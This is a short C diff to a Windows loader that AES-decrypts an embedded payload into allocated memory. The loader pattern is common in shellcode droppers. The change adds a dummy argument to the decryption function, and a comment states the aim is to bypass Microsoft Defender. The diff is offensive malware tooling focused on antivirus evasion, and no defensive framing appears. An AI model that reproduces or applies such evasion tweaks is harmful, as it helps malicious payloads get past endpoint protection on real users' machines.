@@ -8,8 +8,8 @@
 #pragma comment(lib, "Advapi32.lib")
 
 
-
-int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
+// we added a fake function argument to bypass MS Defender
+int AESDecrypt(int fake, char * payload, unsigned int payload_len, char * key, size_t keylen) {
         HCRYPTPROV hProv;
         HCRYPTHASH hHash;
         HCRYPTKEY hKey;
@@ -67,7 +67,7 @@ int main() {
         // Allocate memory for payload
         exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-        AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
+        AESDecrypt(0, (char *) payload, payload_len, (char *) key, sizeof(key));
 
         printHex((char *) payload, payload_len);
 
